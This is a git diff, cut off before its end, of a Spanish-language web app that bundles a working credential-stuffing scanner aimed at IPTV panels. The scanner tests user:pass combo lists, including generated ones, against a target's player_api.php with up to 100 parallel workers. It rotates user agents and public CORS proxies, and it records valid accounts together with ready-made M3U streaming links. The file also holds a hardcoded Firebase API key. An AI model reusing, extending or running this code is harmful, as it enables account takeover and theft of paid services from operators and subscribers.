@@ -6,7 +6,7 @@
     <title>SYS ANDY PRO - LEÓN ROJO + CHAT WHATSAPP + ESTADÍSTICAS</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <style>
-        /* ========== PALETA LEÓN ROJO + NEGRO con difuminaciones (igual que antes) ========== */
+        /* ========== PALETA LEÓN ROJO + NEGRO ========== */
         :root {
             --bg-principal: #000000;
             --bg-tarjeta: #1a0505;
@@ -616,7 +616,7 @@
             padding: 15px;
             margin-top: 15px;
         }
-        /* Estilos específicos del escáner MUNRRA original */
+        /* Estilos específicos del escáner MUNRRA */
         .jobTop {
             display: flex;
             align-items: center;
@@ -883,7 +883,7 @@
 </div>
 
 <script>
-    // ==================== CONFIGURACIÓN FIREBASE (sin cambios) ====================
+    // ==================== CONFIGURACIÓN FIREBASE ====================
     const firebaseConfig = {
         apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
         authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -1270,7 +1270,7 @@
         if (tabName === 'banned' && currentUser?.role === 'Owner') cargarBaneados();
     }
 
-    // ==================== COMBOS (resumido pero funcional) ====================
+    // ==================== COMBOS ====================
     const nombresReales = ["juan","pedro","carlos","luis","andres","david","diego","javier","manuel","alejandro","fernando","miguel","rafael","jorge","antonio","angel","jose","daniel","oscar","ruben"];
     const palabrasExtra = ["admin","user","test","root","master","demo","guest","support","office","system","server","network","digital","global","prime","super","mega","ultra","power","plus"];
     function applyCase(str, caseType) { if (caseType === 'upper') return str.toUpperCase(); if (caseType === 'capitalize') return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase(); return str.toLowerCase(); }
@@ -1327,294 +1327,271 @@
     document.getElementById('mergeFile3').addEventListener('change',()=>readMergeFile(document.getElementById('mergeFile3'), mergeData.file3));
     document.querySelectorAll('.sub-tab').forEach(btn=>{ btn.addEventListener('click',()=>{ const subId=btn.getAttribute('data-sub'); document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active')); document.getElementById(`sub-${subId}`).classList.add('active'); }); });
 
-    // ==================== ESCÁNER MUNRRA ORIGINAL - COPIADO TAL CUAL (adaptado solo para guardar hits) ====================
-    // Las siguientes funciones son el corazón del escáner que funciona.
-    // Se ha respetado cada línea del código original de MUNRRA.
-    
-    // Variables globales del escáner
-    let isRunning = false;
-    let stopRequested = false;
+    // ==================== ESCÁNER MUNRRA ORIGINAL (COPIADO ÍNTEGRO) ====================
+    // Variables globales del escáner (evitamos conflictos con el chat)
+    let isRunningScanner = false;
+    let stopRequestedScanner = false;
     let serverIP = null, serverGeo = null;
     let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
-    const HITS = { 1: [], 2: [], 3: [] };
-    let audioCtx = null;
-    
-    function randomUA(){
-      const uas = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
-      ];
-      return uas[Math.floor(Math.random()*uas.length)];
+    const HITS_SCANNER = { 1: [], 2: [], 3: [] };
+    let audioCtxScanner = null;
+
+    function randomUA() {
+        const uas = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+        ];
+        return uas[Math.floor(Math.random() * uas.length)];
     }
-    
-    function createSession(){
-      return {
-        headers: {
-          "User-Agent": randomUA(),
-          "Accept": "application/json, text/javascript,*/*;q=0.9"
-        },
-        cookies: {}
-      };
+
+    function createSession() {
+        return {
+            headers: {
+                "User-Agent": randomUA(),
+                "Accept": "application/json, text/javascript,*/*;q=0.9"
+            },
+            cookies: {}
+        };
     }
-    
-    function attachCookies(opts, session){
-      const cookieStr = Object.entries(session.cookies||{}).map(([k,v])=>`${k}=${v}`).join("; ");
-      if(cookieStr){
-        opts.headers = { ...(opts.headers||{}) };
-        opts.headers.Cookie = cookieStr;
-      }
-      return opts;
+
+    function attachCookies(opts, session) {
+        const cookieStr = Object.entries(session.cookies || {}).map(([k, v]) => `${k}=${v}`).join("; ");
+        if (cookieStr) {
+            opts.headers = { ...(opts.headers || {}) };
+            opts.headers.Cookie = cookieStr;
+        }
+        return opts;
     }
-    
-    // i18n básico para el escáner (solo español)
+
+    // i18n básico para el escáner
     const tScanner = (key) => {
-      const dict = {
-        hostLabel:"Panel (host con o sin http/https):", hostPH:"ej: lista.com:8080",
-        comboLabel:"Elige archivo .txt con combos (user:pass):",
-        comboTextLabel:"…o pega combos (texto libre)",
-        concLabel:"Número de conexiones paralelas (bots):",
-        useCors:"Usar proxy CORS", sound:"🔔 Sonido al encontrar hit",
-        autoDL:"⬇️ Descargar resultados al finalizar",
-        start:"Iniciar Scan", stop:"Detener Scan", save:"Guardar en el teléfono (.txt)",
-        waiting:"Esperando inicio...", resolving:"Resolviendo IP...", starting:"Iniciando scan...",
-        currentUser:"Usuario actual", processed:"Procesados", hitsFound:"Hits encontrados",
-        scanStopped:" | Scan detenido.", scanDone:" | Scan finalizado.",
-        noHits:"No hay hits", footer:"Hecho por MUNRRA",
-        title:"SYS ANDY PRO", ip:"IP", host:"Host", port:"Puerto", user:"Usuario", pass:"Contraseña",
-        created:"Creada", expires:"Expira", status:"Estado", statusActive:"Active", statusUnknown:"Desconocido",
-        maxConn:"Conexiones máximas", actConn:"Conexiones activas",
-        categories:"📺 IPTV Categories:", none:"N/D", link:"🔗Link M3U",
-        groupsA:"🗣Grupo: https://t.me/+japhlpdroyYzYWJk", groupsB:"🗣Grupo: https://t.me/+XmT5CjFVOIJmNjc0",
-        categoriesRule:"━━━━━━━━━━━━━━━", more:"más"
-      };
-      return dict[key] || key;
+        const dict = {
+            hostLabel: "Panel (host con o sin http/https):", hostPH: "ej: lista.com:8080",
+            comboLabel: "Elige archivo .txt con combos (user:pass):",
+            comboTextLabel: "…o pega combos (texto libre)",
+            concLabel: "Número de conexiones paralelas (bots):",
+            useCors: "Usar proxy CORS", sound: "🔔 Sonido al encontrar hit",
+            autoDL: "⬇️ Descargar resultados al finalizar",
+            start: "Iniciar Scan", stop: "Detener Scan", save: "Guardar en el teléfono (.txt)",
+            waiting: "Esperando inicio...", resolving: "Resolviendo IP...", starting: "Iniciando scan...",
+            currentUser: "Usuario actual", processed: "Procesados", hitsFound: "Hits encontrados",
+            scanStopped: " | Scan detenido.", scanDone: " | Scan finalizado.",
+            noHits: "No hay hits", footer: "Hecho por MUNRRA",
+            title: "SYS ANDY PRO", ip: "IP", host: "Host", port: "Puerto", user: "Usuario", pass: "Contraseña",
+            created: "Creada", expires: "Expira", status: "Estado", statusActive: "Active", statusUnknown: "Desconocido",
+            maxConn: "Conexiones máximas", actConn: "Conexiones activas",
+            categories: "📺 IPTV Categories:", none: "N/D", link: "🔗Link M3U",
+            groupsA: "🗣Grupo: https://t.me/+japhlpdroyYzYWJk", groupsB: "🗣Grupo: https://t.me/+XmT5CjFVOIJmNjc0",
+            categoriesRule: "━━━━━━━━━━━━━━━", more: "más"
+        };
+        return dict[key] || key;
     };
-    
-    // Actualizar textos de la UI del escáner (simplificado)
-    function applyLangScanner(){
-      document.getElementById('lblHost').textContent = tScanner('hostLabel');
-      document.getElementById('hostInput').placeholder = tScanner('hostPH');
-      document.getElementById('lblCombo').textContent = tScanner('comboLabel');
-      document.getElementById('lblConc').textContent = tScanner('concLabel');
-      document.getElementById('lblUseCors').textContent = tScanner('useCors');
-      document.getElementById('lblSound').textContent = tScanner('sound');
-      document.getElementById('lblAutoDL').textContent = tScanner('autoDL');
-      if(document.getElementById('lblComboText')) document.getElementById('lblComboText').textContent = tScanner('comboTextLabel');
-      document.getElementById('startBtn').textContent = tScanner('start');
-      document.getElementById('stopBtn').textContent = tScanner('stop');
-      document.getElementById('saveBtn').textContent = tScanner('save');
-      // No actualizamos el footer para no pisar el de la web
+
+    function limpiarHost(host) { return host.replace(/^https?:\/\//, '').trim(); }
+
+    function uiForScanner(job) {
+        if (job === 1) return {
+            fill: document.getElementById('progressBarFill'),
+            text: document.getElementById('progressText'),
+            user: document.getElementById('currentCombo'),
+            hitsCountEl: document.getElementById('hitsCount1'),
+            hitsArr: HITS_SCANNER[1]
+        };
+        if (job === 2) return {
+            fill: document.getElementById('progressBarFill2'),
+            text: document.getElementById('progressText2'),
+            user: document.getElementById('currentCombo2'),
+            hitsCountEl: document.getElementById('hitsCount2'),
+            hitsArr: HITS_SCANNER[2]
+        };
+        return {
+            fill: document.getElementById('progressBarFill3'),
+            text: document.getElementById('progressText3'),
+            user: document.getElementById('currentCombo3'),
+            hitsCountEl: document.getElementById('hitsCount3'),
+            hitsArr: HITS_SCANNER[3]
+        };
     }
-    
-    // Función para actualizar la UI del escáner con el idioma (se llamará al inicio)
-    applyLangScanner();
-    
-    // Funciones del escáner (iguales al MUNRRA original)
-    function limpiarHost(host){ return host.replace(/^https?:\/\//,'').trim(); }
-    
-    function uiFor(job){
-      if(job === 1) return {
-        fill: document.getElementById('progressBarFill'),
-        text: document.getElementById('progressText'),
-        user: document.getElementById('currentCombo'),
-        hitsCountEl: document.getElementById('hitsCount1'),
-        hitsArr: HITS[1]
-      };
-      if(job === 2) return {
-        fill: document.getElementById('progressBarFill2'),
-        text: document.getElementById('progressText2'),
-        user: document.getElementById('currentCombo2'),
-        hitsCountEl: document.getElementById('hitsCount2'),
-        hitsArr: HITS[2]
-      };
-      return {
-        fill: document.getElementById('progressBarFill3'),
-        text: document.getElementById('progressText3'),
-        user: document.getElementById('currentCombo3'),
-        hitsCountEl: document.getElementById('hitsCount3'),
-        hitsArr: HITS[3]
-      };
+
+    function actualizarProgresoJobScanner(state, ui) {
+        const { processed, total } = state;
+        const pct = total === 0 ? 0 : (processed / total) * 100;
+        if (ui.fill) ui.fill.style.width = pct + '%';
+        if (ui.text) ui.text.textContent = `${tScanner('processed')}: ${processed} / ${total} | ${tScanner('hitsFound')}: ${ui.hitsArr.length}`;
+        if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+        updateStatsOnScan(); // Actualizar estadísticas globales
     }
-    
-    function actualizarProgresoJob(state, ui){
-      const { processed, total } = state;
-      const pct = total===0 ? 0 : (processed/total)*100;
-      if(ui.fill) ui.fill.style.width = pct + '%';
-      if(ui.text) ui.text.textContent = `${tScanner('processed')}: ${processed} / ${total} | ${tScanner('hitsFound')}: ${ui.hitsArr.length}`;
-      if(ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
-      updateStatsOnScan(); // Actualizar estadísticas globales
+
+    function updateStartStateScanner() {
+        const hasHost = !!document.getElementById('hostInput').value.trim();
+        const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
+        document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
     }
-    
-    function updateStartState(){
-      const hasHost = !!document.getElementById('hostInput').value.trim();
-      const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
-      document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
+
+    async function resolveIP(domain) {
+        try {
+            const clean = domain.split(':')[0];
+            if (/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
+            const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
+            if (!res.ok) return null;
+            const data = await res.json();
+            return data.Answer?.find(a => a.type === 1)?.data || null;
+        } catch { return null; }
     }
-    
-    async function resolveIP(domain){
-      try{
-        const clean = domain.split(':')[0];
-        if(/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
-        const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
-        if(!res.ok) return null;
-        const data = await res.json();
-        return data.Answer?.find(a=>a.type===1)?.data || null;
-      }catch{ return null; }
+    async function fetchGeo(ip) {
+        try {
+            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`);
+            if (!res.ok) return null;
+            const data = await res.json();
+            if (data.status !== 'success') return null;
+            return { ip, country: data.country || tScanner('none'), city: data.city || tScanner('none'), flag: flagEmoji(data.countryCode || 'UN') };
+        } catch { return null; }
     }
-    async function fetchGeo(ip){
-      try{
-        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`);
-        if(!res.ok) return null;
-        const data=await res.json();
-        if(data.status!=='success') return null;
-        return { ip, country:data.country||tScanner('none'), city:data.city||tScanner('none'), flag:flagEmoji(data.countryCode||'UN') };
-      }catch{ return null; }
+    function flagEmoji(cc) { return cc.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt())); }
+
+    async function fetchTimeout(resource, options = {}, ms = 7000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), ms);
+        try { const res = await fetch(resource, { ...options, signal: controller.signal }); clearTimeout(id); return res; }
+        catch (e) { clearTimeout(id); throw e; }
     }
-    function flagEmoji(cc){ return cc.toUpperCase().replace(/./g,c=>String.fromCodePoint(127397+c.charCodeAt())); }
-    
-    async function fetchTimeout(resource, options={}, ms=7000){
-      const controller=new AbortController();
-      const id=setTimeout(()=>controller.abort(), ms);
-      try{ const res=await fetch(resource,{...options,signal:controller.signal}); clearTimeout(id); return res; }
-      catch(e){ clearTimeout(id); throw e; }
-    }
-    
+
     const CORS_PROXIES = [
-      'https://cors.isomorphic-git.org/{url}',
-      'https://thingproxy.freeboard.io/fetch/{url}',
-      'https://api.allorigins.win/raw?url={url}',
-      'https://corsproxy.io/?{url}',
-      'https://api.codetabs.com/v1/proxy/?quest={url}',
-      'https://yacdn.org/proxy/{url}',
-      'https://api.s0n1c.org/cors?url={url}',
-      'https://api.scraperapi.com/?url={url}'
+        'https://cors.isomorphic-git.org/{url}',
+        'https://thingproxy.freeboard.io/fetch/{url}',
+        'https://api.allorigins.win/raw?url={url}',
+        'https://corsproxy.io/?{url}',
+        'https://api.codetabs.com/v1/proxy/?quest={url}',
+        'https://yacdn.org/proxy/{url}',
+        'https://api.s0n1c.org/cors?url={url}',
+        'https://api.scraperapi.com/?url={url}'
     ];
     let JOB_PROXIES = {};
     const PROXY_FAILS = new Map();
     const PROXY_MAX_FAILS = 3;
     const PROXY_COOLDOWN_MS = 60000;
-    
-    function proxyIsCold(tpl){
-      const s = PROXY_FAILS.get(tpl);
-      return s && s.until && Date.now() < s.until;
+
+    function proxyIsCold(tpl) {
+        const s = PROXY_FAILS.get(tpl);
+        return s && s.until && Date.now() < s.until;
     }
-    function noteProxyFail(tpl){
-      const s = PROXY_FAILS.get(tpl) || { n:0, until:0 };
-      s.n++;
-      if(s.n >= PROXY_MAX_FAILS){
-        s.until = Date.now() + PROXY_COOLDOWN_MS;
-        s.n = 0;
-      }
-      PROXY_FAILS.set(tpl, s);
-    }
-    function noteProxyOk(tpl){
-      PROXY_FAILS.delete(tpl);
-    }
-    
-    async function fetchWithCors(url, options = {}, jobId = null){
-      const baseOpts = { cache:'no-store', keepalive:false, ...options };
-      if(jobId && JOB_PROXIES[jobId]){
-        const fixedTpl = JOB_PROXIES[jobId];
-        if (!proxyIsCold(fixedTpl)) {
-          try{
-            const proxied = fixedTpl.replace('{url}', encodeURIComponent(url));
-            const r = await fetchTimeout(proxied, baseOpts);
-            if(r && r.ok){ noteProxyOk(fixedTpl); return r; }
-            noteProxyFail(fixedTpl);
-          }catch(_){ noteProxyFail(fixedTpl); }
+    function noteProxyFail(tpl) {
+        let s = PROXY_FAILS.get(tpl) || { n: 0, until: 0 };
+        s.n++;
+        if (s.n >= PROXY_MAX_FAILS) {
+            s.until = Date.now() + PROXY_COOLDOWN_MS;
+            s.n = 0;
         }
-      }
-      try{
-        const r = await fetchTimeout(url, baseOpts);
-        if(r && r.ok) return r;
-      }catch(e){
-        if(!document.getElementById('useCors').checked) throw e;
-      }
-      const pool = (Array.isArray(CORS_PROXIES) ? [...CORS_PROXIES] : []).filter(tpl=>{
-        if(jobId && JOB_PROXIES[jobId] === tpl) return false;
-        return !proxyIsCold(tpl);
-      });
-      for(const tpl of pool.sort(()=>Math.random()-0.5)){
-        try{
-          const proxied = tpl.replace('{url}', encodeURIComponent(url));
-          const r = await fetchTimeout(proxied, baseOpts);
-          if(r && r.ok){ noteProxyOk(tpl); return r; }
-          noteProxyFail(tpl);
-        }catch(_){ noteProxyFail(tpl); }
-      }
-      throw new Error('Fetch failed');
+        PROXY_FAILS.set(tpl, s);
     }
-    
-    async function getJson(url, options = {}, jobId = null){
-      const r = await fetchWithCors(url, options, jobId);
-      if(!r.ok) throw new Error('Bad');
-      return await r.json();
+    function noteProxyOk(tpl) {
+        PROXY_FAILS.delete(tpl);
     }
-    
-    function summarizeCategories(cats, limit=40){
-      if(!Array.isArray(cats)||!cats.length) return `${tScanner('categoriesRule')}\n• ${tScanner('none')}`;
-      const names=cats.map(c=>c.category_name||c.name||'').filter(Boolean);
-      const shown=names.slice(0,limit);
-      const lines=shown.map(n=>`• ${n}`);
-      if(names.length>limit){ const rest=names.length-limit; lines.push(`• … (+${rest} ${tScanner('more')})`); }
-      return `${tScanner('categoriesRule')}\n${lines.join('\n')}`;
-    }
-    
-    function extractCombo(line){
-      if(!line) return null;
-      let s = String(line).normalize('NFKC');
-      s = s.replace(/\s+/g,' ').trim();
-      const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
-      if(!m) return null;
-      const user = m[1].trim();
-      const pass = m[2].trim();
-      if(!user || !pass) return null;
-      return [user, pass];
-    }
-    
-    async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null){
-      try{
-        if(stopRequested) return null;
-        const pair = Array.isArray(combo) ? combo : extractCombo(combo);
-        if(!pair) return null;
-        const [user, pass] = pair;
-        if(ui?.user){ ui.user.textContent = `${tScanner('currentUser')}: ${user}:${pass}`; }
-        const protos=['http://','https://'];
-        let data=null, usedProto='http://';
-        for(const p of protos){
-          const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-          try{
-            const res = await fetchWithCors(url, opts, jobId);
-            if(res.ok){ data=await res.json(); usedProto=p; break; }
-          }catch(_){}
+
+    async function fetchWithCors(url, options = {}, jobId = null) {
+        const baseOpts = { cache: 'no-store', keepalive: false, ...options };
+        if (jobId && JOB_PROXIES[jobId]) {
+            const fixedTpl = JOB_PROXIES[jobId];
+            if (!proxyIsCold(fixedTpl)) {
+                try {
+                    const proxied = fixedTpl.replace('{url}', encodeURIComponent(url));
+                    const r = await fetchTimeout(proxied, baseOpts);
+                    if (r && r.ok) { noteProxyOk(fixedTpl); return r; }
+                    noteProxyFail(fixedTpl);
+                } catch (_) { noteProxyFail(fixedTpl); }
+            }
         }
-        if(!data) return null;
-        const uinfo = data.user_info || {};
-        const ok = (uinfo.status===tScanner('statusActive')) 
-                || String(uinfo.auth)==='1' 
-                || String(uinfo.auth).toLowerCase()==='true' 
-                || uinfo.status==='Active';
-        if(!ok) return null;
-        let liveCatsText = `${tScanner('categoriesRule')}\n• ${tScanner('none')}`;
-        try{
-          const catsUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`;
-          const liveCats = await getJson(catsUrl, opts, jobId);
-          liveCatsText = summarizeCategories(liveCats, 40);
-        }catch(_){}
-        const porta   = host.includes(':') ? host.split(':')[1] : (usedProto==='https://' ? '443' : '80');
-        const hostSem = host.includes(':') ? host.split(':')[0] : host;
-        const creada  = uinfo.created_at ? new Date(uinfo.created_at*1000).toLocaleDateString('es-ES') : tScanner('none');
-        const expira  = uinfo.exp_date   ? new Date(uinfo.exp_date*1000).toLocaleDateString('es-ES') : tScanner('none');
-        const status  = uinfo.status || (String(uinfo.auth)==='1' ? tScanner('statusActive') : tScanner('statusUnknown'));
-        const statusEmoji = (status===tScanner('statusActive') || status==='Active' || status==='Actif') ? '✅' : '❌';
-        const maxConns   = (uinfo.max_connections ?? uinfo.max_cons ?? uinfo['max_connections']) ?? tScanner('none');
-        const activeCons = (uinfo.active_cons ?? uinfo.connected_cons ?? uinfo['active_connections']) ?? tScanner('none');
-        const locLine = serverGeo ? `\n🌍 ${tScanner('ip')}: ${serverGeo.ip}\n${serverGeo.flag} ${serverGeo.city}, ${serverGeo.country}` : '';
-        const link = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
-        const texto = `${tScanner('title')}${locLine}
+        try {
+            const r = await fetchTimeout(url, baseOpts);
+            if (r && r.ok) return r;
+        } catch (e) {
+            if (!document.getElementById('useCors').checked) throw e;
+        }
+        const pool = (Array.isArray(CORS_PROXIES) ? [...CORS_PROXIES] : []).filter(tpl => {
+            if (jobId && JOB_PROXIES[jobId] === tpl) return false;
+            return !proxyIsCold(tpl);
+        });
+        for (const tpl of pool.sort(() => Math.random() - 0.5)) {
+            try {
+                const proxied = tpl.replace('{url}', encodeURIComponent(url));
+                const r = await fetchTimeout(proxied, baseOpts);
+                if (r && r.ok) { noteProxyOk(tpl); return r; }
+                noteProxyFail(tpl);
+            } catch (_) { noteProxyFail(tpl); }
+        }
+        throw new Error('Fetch failed');
+    }
+
+    async function getJson(url, options = {}, jobId = null) {
+        const r = await fetchWithCors(url, options, jobId);
+        if (!r.ok) throw new Error('Bad');
+        return await r.json();
+    }
+
+    function summarizeCategories(cats, limit = 40) {
+        if (!Array.isArray(cats) || !cats.length) return `${tScanner('categoriesRule')}\n• ${tScanner('none')}`;
+        const names = cats.map(c => c.category_name || c.name || '').filter(Boolean);
+        const shown = names.slice(0, limit);
+        const lines = shown.map(n => `• ${n}`);
+        if (names.length > limit) { const rest = names.length - limit; lines.push(`• … (+${rest} ${tScanner('more')})`); }
+        return `${tScanner('categoriesRule')}\n${lines.join('\n')}`;
+    }
+
+    function extractCombo(line) {
+        if (!line) return null;
+        let s = String(line).normalize('NFKC');
+        s = s.replace(/\s+/g, ' ').trim();
+        const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
+        if (!m) return null;
+        const user = m[1].trim();
+        const pass = m[2].trim();
+        if (!user || !pass) return null;
+        return [user, pass];
+    }
+
+    async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null) {
+        try {
+            if (stopRequestedScanner) return null;
+            const pair = Array.isArray(combo) ? combo : extractCombo(combo);
+            if (!pair) return null;
+            const [user, pass] = pair;
+            if (ui?.user) { ui.user.textContent = `${tScanner('currentUser')}: ${user}:${pass}`; }
+            const protos = ['http://', 'https://'];
+            let data = null, usedProto = 'http://';
+            for (const p of protos) {
+                const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+                try {
+                    const res = await fetchWithCors(url, opts, jobId);
+                    if (res.ok) { data = await res.json(); usedProto = p; break; }
+                } catch (_) { }
+            }
+            if (!data) return null;
+            const uinfo = data.user_info || {};
+            const ok = (uinfo.status === tScanner('statusActive'))
+                || String(uinfo.auth) === '1'
+                || String(uinfo.auth).toLowerCase() === 'true'
+                || uinfo.status === 'Active';
+            if (!ok) return null;
+            let liveCatsText = `${tScanner('categoriesRule')}\n• ${tScanner('none')}`;
+            try {
+                const catsUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`;
+                const liveCats = await getJson(catsUrl, opts, jobId);
+                liveCatsText = summarizeCategories(liveCats, 40);
+            } catch (_) { }
+            const porta = host.includes(':') ? host.split(':')[1] : (usedProto === 'https://' ? '443' : '80');
+            const hostSem = host.includes(':') ? host.split(':')[0] : host;
+            const creada = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString('es-ES') : tScanner('none');
+            const expira = uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toLocaleDateString('es-ES') : tScanner('none');
+            const status = uinfo.status || (String(uinfo.auth) === '1' ? tScanner('statusActive') : tScanner('statusUnknown'));
+            const statusEmoji = (status === tScanner('statusActive') || status === 'Active' || status === 'Actif') ? '✅' : '❌';
+            const maxConns = (uinfo.max_connections ?? uinfo.max_cons ?? uinfo['max_connections']) ?? tScanner('none');
+            const activeCons = (uinfo.active_cons ?? uinfo.connected_cons ?? uinfo['active_connections']) ?? tScanner('none');
+            const locLine = serverGeo ? `\n🌍 ${tScanner('ip')}: ${serverGeo.ip}\n${serverGeo.flag} ${serverGeo.city}, ${serverGeo.country}` : '';
+            const link = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+            const texto = `${tScanner('title')}${locLine}
 🌐${tScanner('host')}: ${hostSem}
 🚪${tScanner('port')}: ${porta}
 👤${tScanner('user')}: ${user}
@@ -1629,300 +1606,278 @@ ${liveCatsText}
 ${tScanner('link')}: ${link}
 ${tScanner('groupsA')}
 ${tScanner('groupsB')}`;
-        return { texto, user, pass, host };
-      }catch{ 
-        return null; 
-      }
-    }
-    
-    function mostrarHit(hit, ui){
-      const div = document.createElement('div'); 
-      div.className = 'hit-block';
-      const header = document.createElement('div'); 
-      header.className = 'hit-header';
-      header.textContent = `${tScanner('user')}: ${hit.user} | ${tScanner('pass')}: ${hit.pass}`;
-      const content = document.createElement('pre'); 
-      content.className = 'hit-content'; 
-      content.textContent = hit.texto;
-      div.appendChild(header); 
-      div.appendChild(content);
-      document.getElementById('hitsContainer').prepend(div);
-      if(ui.hitsCountEl){
-        ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
-      }
-      // Guardar el hit en el banco local
-      guardarHitEnBanco(hit.texto, hit.user, hit.pass);
-      // Sonido si está activado
-      if(document.getElementById('soundToggle')?.checked){
-        try{
-          if(!audioCtx){
-            const Ctx=window.AudioContext||window.webkitAudioContext;
-            if(Ctx) audioCtx=new Ctx();
-          }
-          if(audioCtx){
-            const o=audioCtx.createOscillator(), g=audioCtx.createGain();
-            o.type='sine'; o.frequency.setValueAtTime(880, audioCtx.currentTime);
-            g.gain.setValueAtTime(0, audioCtx.currentTime);
-            g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime+0.01);
-            g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime+0.18);
-            o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime+0.2);
-            if(navigator.vibrate) try{ navigator.vibrate(80); }catch(_){}
-          }
-        }catch(_){}
-      }
-      showNotification("🎯 NUEVO HIT", `${hit.user}:${hit.pass} en ${hit.host}`);
-    }
-    
-    async function processarCombosJob(host, combos, conc, jobId){
-      const ui = uiFor(jobId);
-      ui.hitsArr.length = 0;
-      if(ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">0</span>`;
-      if(ui.fill) ui.fill.style.width = '0%';
-      let total = combos.length;
-      let processed = 0;
-      if(ui.text) ui.text.textContent = tScanner('waiting');
-      if(ui.user) ui.user.textContent = `${tScanner('currentUser')}: -`;
-      actualizarProgresoJob({ processed, total }, ui);
-      conc = Math.max(1, Math.min(100, conc|0));
-      const sleep = ms => new Promise(r => setTimeout(r, ms));
-      let index = 0;
-      async function worker(){
-        const session = createSession();
-        while(index < total && !stopRequested){
-          const i = index++;
-          if(i >= total) break;
-          const combo = combos[i];
-          if(!combo) continue;
-          if(ui.user) ui.user.textContent = `${tScanner('currentUser')}: ${combo}`;
-          let opts = { headers: { ...session.headers } };
-          opts = attachCookies(opts, session);
-          try{
-            const hit = await validarCombo(host, combo, opts, session, ui, jobId);
-            if(stopRequested) break;
-            if(hit){
-              ui.hitsArr.push(hit);
-              mostrarHit(hit, ui);
-            }
-          }catch(_){}
-          finally{
-            processed++;
-            actualizarProgresoJob({ processed, total }, ui);
-          }
-          await sleep(40 + Math.random()*140);
-          if(stopRequested) break;
+            return { texto, user, pass, host };
+        } catch {
+            return null;
         }
-      }
-      if(ui.text) ui.text.textContent = tScanner('starting');
-      await sleep((jobId - 1) * 100);
-      await Promise.all(Array.from({ length: conc }, () => worker()));
-      if(ui.user) ui.user.textContent = `${tScanner('currentUser')}: -`;
-      if(ui.text) ui.text.textContent += (stopRequested ? tScanner('scanStopped') : tScanner('scanDone'));
     }
-    
